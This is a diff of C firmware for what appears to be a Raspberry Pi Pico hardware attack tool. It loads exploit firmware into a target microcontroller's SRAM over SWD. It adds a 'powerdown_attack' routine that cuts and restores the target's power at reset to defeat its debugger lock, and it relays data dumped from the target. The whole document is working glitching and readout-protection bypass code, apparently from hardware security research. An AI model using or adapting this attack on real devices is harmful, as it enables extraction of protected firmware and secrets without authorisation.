@@ -61,14 +61,8 @@ int bmp_loader(const char *data, uint32_t length, uint32_t offset, bool check_on
 static void target_power(bool on)
 {
 	if (on) {
-		// gpio_put(POWER1_PIN, 1);
-		// gpio_put(POWER2_PIN, 1);
-		// gpio_put(POWER3_PIN, 1);
 		gpio_set_mask(1 << POWER1_PIN | 1 << POWER2_PIN | 1 << POWER3_PIN);
 	} else {
-		// gpio_put(POWER1_PIN, 0);
-		// gpio_put(POWER2_PIN, 0);
-		// gpio_put(POWER3_PIN, 0);
 		gpio_clr_mask(1 << POWER1_PIN | 1 << POWER2_PIN | 1 << POWER3_PIN);
 	}
 }
@@ -109,19 +103,36 @@ static void validate_reset(void)
 	}
 }
 
-static char payload_swapped[sizeof(payload) + 4];
+__attribute__((section(".data"))) static uint32_t powerdown_attack(void)
+{
+	// Drop the power
+	gpio_put(LED_PIN, 1);
+	target_power(false);
+
+	// Wait for reset to go low
+	uint32_t count = 0;
+	while (gpio_get(RESET_PIN)) {
+		count += 1;
+		// tight_loop_contents();
+	}
+
+	// Immediately re-enable power
+	target_power(true);
+	return count;
+}
+
+// static char payload_swapped[sizeof(payload) + 4];
 
 int main()
 {
 	stdio_init_all();
-	while (!tud_cdc_connected()) {
-	}
+	// while (!tud_cdc_connected()) {
+	// }
 
-	// Byteswap the payload
-
-	for (int i = 0; i < sizeof(payload) / 4; i += 1) {
-		payload_swapped[i] = __builtin_bswap32(payload[i]);
-	}
+	// // Byteswap the payload
+	// for (int i = 0; i < sizeof(payload) / 4; i += 1) {
+	// 	payload_swapped[i] = __builtin_bswap32(payload[i]);
+	// }
 
 	// Init GPIOs
 	gpio_init(LED_PIN);
@@ -167,7 +178,7 @@ int main()
 	validate_reset();
 
 	// Load the exploit firmware onto the target
-	while (bmp_loader(payload, sizeof(payload) & ~3, 0x20000000, false) != 0) {
+	while (bmp_loader(payload, sizeof(payload), 0x20000000, false) != 0) {
 		printf("Target not found... retrying\n");
 		handle_control(500);
 	}
@@ -185,26 +196,20 @@ int main()
 	// gpio_set_dir(SWCLK_PIN, GPIO_IN);
 	// gpio_set_dir(SWDIO_PIN, GPIO_IN);
 
-	gpio_set_dir(RESET_PIN, GPIO_OUT);
-	sleep_ms(10);
-	gpio_set_dir(RESET_PIN, GPIO_IN);
+	// gpio_set_dir(RESET_PIN, GPIO_OUT);
+	// sleep_ms(10);
+	// gpio_set_dir(RESET_PIN, GPIO_IN);
 
-	// // Drop the power
-	// gpio_put(LED_PIN, 1);
-	// target_power(false);
+	uint32_t count = powerdown_attack();
 
-	// // Wait for reset to go low
-	// int count = 0;
-	// while (gpio_get(RESET_PIN)) {
-	// 	count += 1;
-	// 	// tight_loop_contents();
-	// }
+	printf("Target powered off after %d ticks\n", count);
 
-	// // Immediately re-enable power
-	// target_power(true);
-
-	// printf("Target powered off after %d ticks\n", count);
-	// bmp_loader(payload_swapped, sizeof(payload_swapped), 0x20000000, true);
+	// Payload verification
+	{
+		bmp_loader(payload, sizeof(payload), 0x20000000, true);
+		gpio_set_dir(SWCLK_PIN, GPIO_IN);
+		gpio_set_dir(SWDIO_PIN, GPIO_IN);
+	}
 
 	// // Debugger lock is now disabled and we're now
 	// // booting from SRAM. Wait for the target to run stage 1
@@ -234,18 +239,22 @@ int main()
 	printf("Reading data from target...\n");
 
 	// Forward dumped data from UART to USB serial
-	static int last_swclk = 0;
-	static int last_swdio = 0;
+	int last_swclk = 0;
+	int last_swdio = 0;
 	while (true) {
-		if (gpio_get(SWCLK_PIN) != last_swclk) {
-			last_swclk = !last_swclk;
-			printf("SWCLK %d -> %d\n", !last_swclk, last_swclk);
+		int swclk = gpio_get(SWCLK_PIN);
+		int swdio = gpio_get(SWDIO_PIN);
+
+		if (swclk != last_swclk) {
+			printf("SWCLK %d -> %d\n", last_swclk, swclk);
+			last_swclk = swclk;
 		}
-		if (gpio_get(SWDIO_PIN) != last_swdio) {
-			last_swdio = !last_swdio;
-			printf("SWDIO %d -> %d\n", !last_swdio, last_swdio);
+
+		if (swdio != last_swdio) {
+			printf("SWDIO %d -> %d\n", last_swdio, swdio);
+			last_swdio = swdio;
 		}
-		handle_control(500);
+		handle_control(1);
 
 		// int c;
 		// if (uart_is_readable(UART_ID)) {
